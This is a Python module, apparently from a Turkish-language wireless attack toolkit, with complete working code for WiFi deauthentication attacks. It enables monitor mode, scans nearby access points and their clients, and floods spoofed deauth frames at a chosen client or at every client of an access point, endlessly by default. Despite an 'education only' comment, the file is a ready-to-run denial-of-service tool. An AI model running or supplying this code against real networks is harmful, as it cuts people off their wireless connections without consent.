from settings.set_loging import write_log
write_log("[&] 'deauth_attack.py' dosyası çalıştırıldı", level="EXEC")

import os
import re
import time
import subprocess
import threading
from settings import set_themes as clr
from settings.set_lang import get_string

# ============================================================
# UYARI: Bu modül YALNIZCA eğitim amaçlıdır.
# İzinsiz kullanım YASA DIŞIDIR.
# ============================================================

# --------------- Gereksinim Kontrolleri ---------------

def check_root():
    """Root yetkisi kontrolü"""
    try:
        if os.geteuid() == 0:
            return True
    except AttributeError:
        pass
    
    # Termux root kontrolü
    is_termux = os.environ.get("TERMUX_VERSION") is not None or os.path.exists("/data/data/com.termux")
    if is_termux:
        try:
            result = subprocess.run(
                ["su", "-c", "id"],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0 and "uid=0" in result.stdout:
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
    
    return False

def check_scapy():
    """Scapy modülü kontrolü"""
    try:
        import scapy
        return True
    except ImportError:
        return False

def check_wifi_interfaces():
    """WiFi arayüzlerini listeler"""
    interfaces = []
    
    # iwconfig ile kontrol
    try:
        result = subprocess.run(
            ["iwconfig"],
            capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.splitlines():
            if "IEEE 802.11" in line or "ESSID" in line:
                iface = line.split()[0]
                interfaces.append(iface)
    except FileNotFoundError:
        pass
    
    # iw dev ile kontrol (fallback)
    if not interfaces:
        try:
            result = subprocess.run(
                ["iw", "dev"],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.splitlines():
                match = re.search(r'Interface\s+(\S+)', line)
                if match:
                    interfaces.append(match.group(1))
        except FileNotFoundError:
            pass
    
    # /sys/class/net ile kontrol (son fallback)
    if not interfaces:
        try:
            for iface in os.listdir('/sys/class/net/'):
                wireless_path = f'/sys/class/net/{iface}/wireless'
                phy_path = f'/sys/class/net/{iface}/phy80211'
                if os.path.exists(wireless_path) or os.path.exists(phy_path):
                    interfaces.append(iface)
        except (FileNotFoundError, PermissionError):
            pass
    
    return interfaces

def check_requirements():
    """Tüm gereksinimleri kontrol eder
    
    Returns:
        dict: {"root": bool, "scapy": bool, "wifi": list, "ready": bool}
    """
    root = check_root()
    scapy = check_scapy()
    wifi = check_wifi_interfaces()
    
    return {
        "root": root,
        "scapy": scapy,
        "wifi": wifi,
        "ready": root and scapy and len(wifi) > 0
    }

# --------------- Monitor Mod Yönetimi ---------------

def get_interface_mode(iface):
    """Arayüzün mevcut modunu kontrol eder
    
    Returns:
        str: "managed", "monitor", veya "unknown"
    """
    try:
        result = subprocess.run(
            ["iwconfig", iface],
            capture_output=True, text=True, timeout=5
        )
        if "Mode:Monitor" in result.stdout:
            return "monitor"
        elif "Mode:Managed" in result.stdout:
            return "managed"
    except FileNotFoundError:
        # iw ile dene
        try:
            result = subprocess.run(
                ["iw", "dev", iface, "info"],
                capture_output=True, text=True, timeout=5
            )
            if "type monitor" in result.stdout:
                return "monitor"
            elif "type managed" in result.stdout:
                return "managed"
        except FileNotFoundError:
            pass
    
    return "unknown"

def enable_monitor_mode(iface):
    """Arayüzü monitor moda geçirir
    
    Returns:
        tuple: (success: bool, monitor_iface: str)
    """
    write_log(f"[~] Monitor mod aktifleştiriliyor: {iface}", level="FUNC")
    
    # Zaten monitor modda mı?
    if get_interface_mode(iface) == "monitor":
        write_log(f"[#] {iface} zaten monitor modda", level="EXEC")
        return True, iface
    
    # 1. airmon-ng ile dene
    try:
        # Önce çakışan işlemleri kapat
        subprocess.run(
            ["airmon-ng", "check", "kill"],
            capture_output=True, text=True, timeout=10
        )
        
        result = subprocess.run(
            ["airmon-ng", "start", iface],
            capture_output=True, text=True, timeout=15
        )
        
        if result.returncode == 0:
            # Monitor arayüz adını bul (wlan0mon gibi)
            mon_iface = iface + "mon"
            # Çıktıdan monitor arayüz adını bulmaya çalış
            match = re.search(r'\(monitor mode.*enabled.*on\s+(\S+)\)', result.stdout)
            if match:
                mon_iface = match.group(1)
            else:
                # wlan0mon veya orijinal isim olabilir
                if os.path.exists(f'/sys/class/net/{iface}mon'):
                    mon_iface = iface + "mon"
                else:
                    mon_iface = iface
            
            write_log(f"[#] Monitor mod aktif (airmon-ng): {mon_iface}", level="EXEC")
            return True, mon_iface
    except FileNotFoundError:
        write_log("[!] airmon-ng bulunamadı, iw ile deneniyor..", level="ERROR")
    
    # 2. iw/ip ile dene
    try:
        # Arayüzü kapat
        subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True, timeout=5)
        
        # Monitor moda geç
        result = subprocess.run(
            ["iw", iface, "set", "monitor", "none"],
            capture_output=True, text=True, timeout=5
        )
        
        # Arayüzü aç
        subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True, timeout=5)
        
        if result.returncode == 0:
            write_log(f"[#] Monitor mod aktif (iw): {iface}", level="EXEC")
            return True, iface
    except FileNotFoundError:
        pass
    
    write_log(f"[!] Monitor mod aktifleştirilemedi: {iface}", level="ERROR")
    return False, iface

def disable_monitor_mode(iface):
    """Monitor modu kapatır ve managed moda döner
    
    Returns:
        tuple: (success: bool, managed_iface: str)
    """
    write_log(f"[~] Monitor mod kapatılıyor: {iface}", level="FUNC")
    
    # 1. airmon-ng ile
    try:
        result = subprocess.run(
            ["airmon-ng", "stop", iface],
            capture_output=True, text=True, timeout=15
        )
        if result.returncode == 0:
            # Orijinal arayüz adını bul
            managed_iface = iface.replace("mon", "")
            match = re.search(r'\(station mode.*enabled.*on\s+(\S+)\)', result.stdout)
            if match:
                managed_iface = match.group(1)
            
            write_log(f"[#] Monitor mod kapatıldı (airmon-ng): {managed_iface}", level="EXEC")
            
            # NetworkManager'ı yeniden başlat
            subprocess.run(["systemctl", "start", "NetworkManager"], capture_output=True, timeout=10)
            
            return True, managed_iface
    except FileNotFoundError:
        pass
    
    # 2. iw ile
    try:
        subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True, timeout=5)
        result = subprocess.run(
            ["iw", iface, "set", "type", "managed"],
            capture_output=True, text=True, timeout=5
        )
        subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True, timeout=5)
        
        if result.returncode == 0:
            managed_iface = iface.replace("mon", "") if iface.endswith("mon") else iface
            write_log(f"[#] Monitor mod kapatıldı (iw): {managed_iface}", level="EXEC")
            return True, managed_iface
    except FileNotFoundError:
        pass
    
    write_log(f"[!] Monitor mod kapatılamadı: {iface}", level="ERROR")
    return False, iface

# --------------- AP & İstemci Tarama ---------------

def scan_access_points(iface, duration=10):
    """Çevredeki Access Point'leri tarar
    
    Args:
        iface: Monitor moddaki arayüz adı
        duration: Tarama süresi (saniye)
    
    Returns:
        list: [{"bssid": str, "ssid": str, "channel": int, "signal": str}]
    """
    write_log(f"[~] AP taraması başlatılıyor: {iface} ({duration}s)", level="FUNC")
    
    try:
        from scapy.all import sniff, Dot11, Dot11Beacon, Dot11ProbeResp, Dot11Elt
    except ImportError:
        write_log("[!] Scapy import hatası", level="ERROR")
        return []
    
    ap_list = {}
    _stop_sniff = threading.Event()
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            bssid = pkt[Dot11].addr2
            if bssid and bssid not in ap_list:
                # SSID çıkar
                ssid = ""
                if pkt.haslayer(Dot11Elt):
                    elt = pkt[Dot11Elt]
                    while elt:
                        if elt.ID == 0:  # SSID
                            try:
                                ssid = elt.info.decode('utf-8', errors='replace')
                            except:
                                ssid = "<gizli>"
                            break
                        elt = elt.payload if hasattr(elt, 'payload') and isinstance(elt.payload, Dot11Elt) else None
                
                # Kanal çıkar
                channel = 0
                try:
                    if pkt.haslayer(Dot11Elt):
                        elt = pkt[Dot11Elt]
                        while elt:
                            if elt.ID == 3:  # DS Parameter Set - Channel
                                channel = int(ord(elt.info)) if len(elt.info) == 1 else 0
                                break
                            elt = elt.payload if hasattr(elt, 'payload') and isinstance(elt.payload, Dot11Elt) else None
                except:
                    pass
                
                # Sinyal gücü
                signal = ""
                try:
                    if hasattr(pkt, 'dBm_AntSignal'):
                        signal = f"{pkt.dBm_AntSignal} dBm"
                except:
                    pass
                
                ap_list[bssid] = {
                    "bssid": bssid.upper(),
                    "ssid": ssid if ssid else "<gizli>",
                    "channel": channel,
                    "signal": signal
                }
    
    def stop_filter(pkt):
        return _stop_sniff.is_set()
    
    # Kanal değiştirme thread'i (channel hopping)
    def channel_hopper():
        channels = list(range(1, 14))
        while not _stop_sniff.is_set():
            for ch in channels:
                if _stop_sniff.is_set():
                    break
                try:
                    subprocess.run(
                        ["iw", "dev", iface, "set", "channel", str(ch)],
                        capture_output=True, timeout=2
                    )
                except:
                    pass
                time.sleep(0.3)
    
    hopper = threading.Thread(target=channel_hopper, daemon=True)
    hopper.start()
    
    try:
        sniff(iface=iface, prn=packet_handler, timeout=duration,
              stop_filter=stop_filter, store=0)
    except Exception as e:
        write_log(f"[!] AP tarama hatası: {e}", level="ERROR")
    finally:
        _stop_sniff.set()
    
    result = list(ap_list.values())
    write_log(f"[#] {len(result)} AP bulundu", level="EXEC")
    return result

def scan_clients(iface, target_bssid, duration=15):
    """Belirli bir AP'ye bağlı istemcileri tarar
    
    Args:
        iface: Monitor moddaki arayüz
        target_bssid: Hedef AP'nin BSSID'si
        duration: Tarama süresi (saniye)
    
    Returns:
        list: [{"mac": str, "bssid": str}]
    """
    write_log(f"[~] İstemci taraması başlatılıyor: {target_bssid} ({duration}s)", level="FUNC")
    
    try:
        from scapy.all import sniff, Dot11
    except ImportError:
        return []
    
    clients = {}
    target_bssid = target_bssid.lower()
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            # Broadcast ve multicast'i filtrele
            broadcast_macs = ["ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"]
            
            addr1 = pkt[Dot11].addr1  # Hedef
            addr2 = pkt[Dot11].addr2  # Kaynak
            addr3 = pkt[Dot11].addr3  # BSSID (genelde)
            
            if not addr1 or not addr2:
                return
            
            addr1 = addr1.lower()
            addr2 = addr2.lower()
            
            # Bu AP ile ilişkili paketleri filtrele
            if addr3 and addr3.lower() == target_bssid:
                # Kaynak BSSID değilse, istemcidir
                if addr2 != target_bssid and addr2 not in broadcast_macs:
                    if addr2 not in clients and not addr2.startswith("33:33:"):
                        clients[addr2] = {
                            "mac": addr2.upper(),
                            "bssid": target_bssid.upper()
                        }
            elif addr1 == target_bssid or addr2 == target_bssid:
                other = addr2 if addr1 == target_bssid else addr1
                if other not in broadcast_macs and other not in clients and not other.startswith("33:33:"):
                    clients[other] = {
                        "mac": other.upper(),
                        "bssid": target_bssid.upper()
                    }
    
    try:
        sniff(iface=iface, prn=packet_handler, timeout=duration, store=0)
    except Exception as e:
        write_log(f"[!] İstemci tarama hatası: {e}", level="ERROR")
    
    result = list(clients.values())
    write_log(f"[#] {len(result)} istemci bulundu", level="EXEC")
    return result

def set_channel(iface, channel):
    """WiFi arayüzünü belirtilen kanala ayarlar"""
    try:
        subprocess.run(
            ["iw", "dev", iface, "set", "channel", str(channel)],
            capture_output=True, timeout=5
        )
        return True
    except:
        return False

# --------------- Deauth Saldırısı ---------------

_attack_running = False
_attack_thread = None

def deauth_attack(iface, target_mac, gateway_mac, count=0, interval=0.1, callback=None):
    """Hedefli Deauth saldırısı başlatır
    
    Args:
        iface: Monitor moddaki arayüz
        target_mac: Hedef istemci MAC
        gateway_mac: AP/Gateway BSSID
        count: Paket sayısı (0 = sonsuz)
        interval: Paketler arası bekleme (saniye)
        callback: Her paket gönderiminde çağrılacak fonksiyon(sent_count)
    
    Returns:
        int: Gönderilen toplam paket sayısı
    """
    global _attack_running
    
    write_log(f"[~] Deauth saldırısı başlatılıyor: {target_mac} -> {gateway_mac}", level="FUNC")
    
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    except ImportError:
        write_log("[!] Scapy import hatası", level="ERROR")
        return 0
    
    _attack_running = True
    sent = 0
    
    # İstemciye deauth paketi (AP'den geliyormuş gibi)
    pkt1 = RadioTap() / Dot11(
        addr1=target_mac,    # Hedef istemci
        addr2=gateway_mac,   # Kaynak (AP gibi görünür)
        addr3=gateway_mac    # BSSID
    ) / Dot11Deauth(reason=7)
    
    # AP'ye deauth paketi (istemciden geliyormuş gibi)
    pkt2 = RadioTap() / Dot11(
        addr1=gateway_mac,   # Hedef AP
        addr2=target_mac,    # Kaynak (istemci gibi görünür)
        addr3=gateway_mac    # BSSID
    ) / Dot11Deauth(reason=7)
    
    try:
        while _attack_running:
            if count > 0 and sent >= count:
                break
            
            sendp(pkt1, iface=iface, count=1, inter=0, verbose=0)
            sendp(pkt2, iface=iface, count=1, inter=0, verbose=0)
            sent += 1
            
            if callback:
                callback(sent)
            
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        write_log(f"[!] Deauth hatası: {e}", level="ERROR")
    finally:
        _attack_running = False
    
    write_log(f"[#] Deauth tamamlandı: {sent} paket gönderildi", level="EXEC")
    return sent

def broadcast_deauth(iface, gateway_mac, count=0, interval=0.1, callback=None):
    """Broadcast Deauth saldırısı (tüm istemcileri hedefler)
    
    Args:
        iface: Monitor moddaki arayüz
        gateway_mac: AP/Gateway BSSID
        count: Paket sayısı (0 = sonsuz)
        interval: Paketler arası bekleme (saniye)
        callback: Her paket gönderiminde çağrılacak fonksiyon(sent_count)
    
    Returns:
        int: Gönderilen toplam paket sayısı
    """
    global _attack_running
    
    write_log(f"[~] Broadcast Deauth başlatılıyor: {gateway_mac}", level="FUNC")
    
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    except ImportError:
        write_log("[!] Scapy import hatası", level="ERROR")
        return 0
    
    _attack_running = True
    sent = 0
    broadcast = "ff:ff:ff:ff:ff:ff"
    
    # Broadcast deauth paketi
    pkt = RadioTap() / Dot11(
        addr1=broadcast,     # Broadcast
        addr2=gateway_mac,   # AP gibi görünür
        addr3=gateway_mac    # BSSID
    ) / Dot11Deauth(reason=7)
    
    try:
        while _attack_running:
            if count > 0 and sent >= count:
                break
            
            sendp(pkt, iface=iface, count=1, inter=0, verbose=0)
            sent += 1
            
            if callback:
                callback(sent)
            
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        write_log(f"[!] Broadcast Deauth hatası: {e}", level="ERROR")
    finally:
        _attack_running = False
    
    write_log(f"[#] Broadcast Deauth tamamlandı: {sent} paket gönderildi", level="EXEC")
    return sent

def stop_attack():
    """Devam eden saldırıyı durdurur"""
    global _attack_running
    _attack_running = False
    write_log("[#] Saldırı durduruldu", level="EXEC")

def start_attack_thread(attack_func, **kwargs):
    """Saldırıyı ayrı thread'de başlatır
    
    Args:
        attack_func: deauth_attack veya broadcast_deauth
        **kwargs: Saldırı fonksiyonuna geçilecek parametreler
    
    Returns:
        threading.Thread
    """
    global _attack_thread
    _attack_thread = threading.Thread(target=attack_func, kwargs=kwargs, daemon=True)
    _attack_thread.start()
    return _attack_thread

def is_attack_running():
    """Saldırı devam ediyor mu?"""
    return _attack_running
